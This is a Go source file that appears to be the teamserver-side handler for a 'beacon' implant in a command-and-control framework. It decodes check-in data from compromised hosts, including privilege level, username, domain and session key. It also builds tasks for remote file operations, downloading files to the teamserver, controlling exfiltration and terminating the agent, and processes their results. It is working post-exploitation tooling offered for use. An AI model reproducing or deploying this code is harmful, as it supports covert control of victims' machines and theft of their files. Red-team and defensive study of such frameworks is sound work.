package main

import (
	"bytes"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"strconv"
)

const (
	SetName     = "beacon"
	SetListener = "BeaconHTTP"
	SetUiPath   = "_ui_agent.json"
	SetCmdPath  = "_cmd_agent.json"
)

func CreateAgent(initialData []byte) (AgentData, error) {
	var agent AgentData

	/// START CODE HERE

	packer := CreatePacker(initialData)
	agent.Sleep = packer.ParseInt32()
	agent.Jitter = packer.ParseInt32()
	agent.ACP = int(packer.ParseInt16())
	agent.OemCP = int(packer.ParseInt16())
	agent.GmtOffset = int(packer.ParseInt8())
	agent.Pid = fmt.Sprintf("%v", packer.ParseInt16())
	agent.Tid = fmt.Sprintf("%v", packer.ParseInt16())

	buildNumber := packer.ParseInt32()
	majorVersion := packer.ParseInt8()
	minorVersion := packer.ParseInt8()
	internalIp := packer.ParseInt32()
	flag := packer.ParseInt8()

	agent.Arch = "x32"
	if (flag & 0b00000001) > 0 {
		agent.Arch = "x64"
	}

	systemArch := "x32"
	if (flag & 0b00000010) > 0 {
		systemArch = "x64"
	}

	agent.Elevated = false
	if (flag & 0b00000100) > 0 {
		agent.Elevated = true
	}

	IsServer := false
	if (flag & 0b00001000) > 0 {
		IsServer = true
	}

	agent.InternalIP = int32ToIPv4(internalIp)
	agent.Os, agent.OsDesc = GetOsVersion(majorVersion, minorVersion, buildNumber, IsServer, systemArch)

	agent.Async = true
	agent.SessionKey = packer.ParseBytes()
	agent.Domain = string(packer.ParseBytes())
	agent.Computer = string(packer.ParseBytes())
	agent.Username = ConvertCpToUTF8(string(packer.ParseBytes()), agent.ACP)
	agent.Process = ConvertCpToUTF8(string(packer.ParseBytes()), agent.ACP)

	/// END CODE

	return agent, nil
}

func PackTasks(agentData AgentData, tasksArray []TaskData) ([]byte, error) {
	var packData []byte

	/// START CODE HERE

	var (
		array []interface{}
		err   error
	)

	for _, taskData := range tasksArray {
		taskId, err := strconv.ParseInt(taskData.TaskId, 16, 64)
		if err != nil {
			return nil, err
		}
		array = append(array, taskData.Data)
		array = append(array, int(taskId))
	}

	packData, err = PackArray(array)
	if err != nil {
		return nil, err
	}

	size := make([]byte, 4)
	binary.LittleEndian.PutUint32(size, uint32(len(packData)))
	packData = append(size, packData...)

	/// END CODE

	return packData, nil
}

func CreateTask(agent AgentData, command string, args map[string]any) (TaskData, string, error) {
	var (
		taskData    TaskData
		messageInfo string
		err         error
	)

	subcommand, _ := args["subcommand"].(string)

	/// START CODE HERE

	var (
		array    []interface{}
		packData []byte
		taskType TaskType = TASK
	)

	switch command {

	case "cd":
		messageInfo = "Task: change working directory"
		path, ok := args["path"].(string)
		if !ok {
			err = errors.New("parameter 'path' must be set")
			goto RET
		}
		array = []interface{}{COMMAND_CD, ConvertUTF8toCp(path, agent.ACP)}
		break

	case "cp":
		messageInfo = "Task: copy file"
		src, ok := args["src"].(string)
		if !ok {
			err = errors.New("parameter 'src' must be set")
			goto RET
		}
		dst, ok := args["dst"].(string)
		if !ok {
			err = errors.New("parameter 'dst' must be set")
			goto RET
		}
		array = []interface{}{COMMAND_CP, ConvertUTF8toCp(src, agent.ACP), ConvertUTF8toCp(dst, agent.ACP)}

		break

	case "download":
		messageInfo = "Task: download file to teamserver"
		path, ok := args["file"].(string)
		if !ok {
			err = errors.New("parameter 'file' must be set")
			goto RET
		}
		array = []interface{}{COMMAND_DOWNLOAD, ConvertUTF8toCp(path, agent.ACP)}
		break

	case "exfil":
		fid, ok := args["file_id"].(string)
		if !ok {
			err = errors.New("parameter 'file_id' must be set")
			goto RET
		}

		fileId, err := strconv.ParseInt(fid, 16, 64)
		if err != nil {
			goto RET
		}

		if subcommand == "cancel" {
			array = []interface{}{COMMAND_EXFIL, DOWNLOAD_STATE_CANCELED, int(fileId)}
		} else if subcommand == "stop" {
			array = []interface{}{COMMAND_EXFIL, DOWNLOAD_STATE_STOPPED, int(fileId)}
		} else if subcommand == "start" {
			array = []interface{}{COMMAND_EXFIL, DOWNLOAD_STATE_RUNNING, int(fileId)}
		} else {
			err = errors.New("subcommand must be 'cancel', 'start' or 'stop'")
			goto RET
		}
		break

	case "pwd":
		messageInfo = "Task: print working directory"
		array = []interface{}{COMMAND_PWD}
		break

	case "terminate":
		messageInfo = "Task: terminate agent session"
		if subcommand == "thread" {
			array = []interface{}{COMMAND_TERMINATE, 1}
		} else if subcommand == "process" {
			array = []interface{}{COMMAND_TERMINATE, 2}
		} else {
			err = errors.New("subcommand must be 'thread' or 'process'")
			goto RET
		}
		break

	default:
		err = errors.New(fmt.Sprintf("Command '%v' not found", command))
		goto RET
	}

	packData, err = PackArray(array)
	if err != nil {
		goto RET
	}

	taskData = TaskData{
		Type: taskType,
		Data: packData,
		Sync: true,
	}

	/// END CODE

RET:
	return taskData, messageInfo, err
}

func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, packedData []byte) {

	packer := CreatePacker(packedData)
	size := packer.ParseInt32()
	if size-4 != packer.Size() {
		fmt.Println("Invalid tasks data")
	}

	for packer.Size() >= 8 {
		var taskObject bytes.Buffer

		TaskId := packer.ParseInt32()
		commandId := packer.ParseInt32()
		task := taskData
		task.TaskId = fmt.Sprintf("%08x", TaskId)

		switch commandId {

		case COMMAND_CD:
			path := ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)
			task.Message = "Curren working directory:"
			task.ClearText = path
			break

		case COMMAND_CP:
			break

		case COMMAND_DOWNLOAD:
			fileId := fmt.Sprintf("%08x", packer.ParseInt32())
			downloadCommand := packer.ParseInt8()
			if downloadCommand == DOWNLOAD_START {
				fileSize := packer.ParseInt32()
				fileName := ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)
				task.Message = fmt.Sprintf("The download of the '%s' file (%v bytes) has started: [fid %v]", fileName, fileSize, fileId)
				task.Completed = false
				ts.TsDownloadAdd(agentData.Id, fileId, fileName, int(fileSize))

			} else if downloadCommand == DOWNLOAD_CONTINUE {
				fileContent := packer.ParseBytes()
				task.Completed = false
				ts.TsDownloadUpdate(fileId, DOWNLOAD_STATE_RUNNING, fileContent)
				continue

			} else if downloadCommand == DOWNLOAD_FINISH {
				task.Message = fmt.Sprintf("File download complete: [fid %v]", fileId)
				ts.TsDownloadClose(fileId, DOWNLOAD_STATE_FINISHED)
			}
			break

		case COMMAND_EXFIL:
			fileId := fmt.Sprintf("%08x", packer.ParseInt32())
			downloadState := packer.ParseInt8()

			if downloadState == DOWNLOAD_STATE_STOPPED {
				task.Message = fmt.Sprintf("Download '%v' successful stopped", fileId)
				ts.TsDownloadUpdate(fileId, DOWNLOAD_STATE_STOPPED, []byte(""))

			} else if downloadState == DOWNLOAD_STATE_RUNNING {
				task.Message = fmt.Sprintf("Download '%v' successful resumed", fileId)
				ts.TsDownloadUpdate(fileId, DOWNLOAD_STATE_RUNNING, []byte(""))

			} else if downloadState == DOWNLOAD_STATE_CANCELED {
				task.Message = fmt.Sprintf("Download '%v' successful canceled", fileId)
				ts.TsDownloadClose(fileId, DOWNLOAD_STATE_CANCELED)
			}
			break

		case COMMAND_PWD:
			path := ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)
			task.Message = "Curren working directory:"
			task.ClearText = path
			break

		case COMMAND_ERROR:
			errorCode := packer.ParseInt32()
			task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, win32ErrorCodes[errorCode])
			task.MessageType = MESSAGE_ERROR

		default:
			continue
		}

		_ = json.NewEncoder(&taskObject).Encode(task)
		ts.TsAgentTaskUpdate(agentData.Id, taskObject.Bytes())
	}
}

func BrowserDownloadChangeState(fid string, newState int) ([]byte, error) {

	fileId, err := strconv.ParseInt(fid, 16, 64)
	if err != nil {
		return nil, err
	}

	array := []interface{}{COMMAND_EXFIL, newState, int(fileId)}

	return PackArray(array)
}
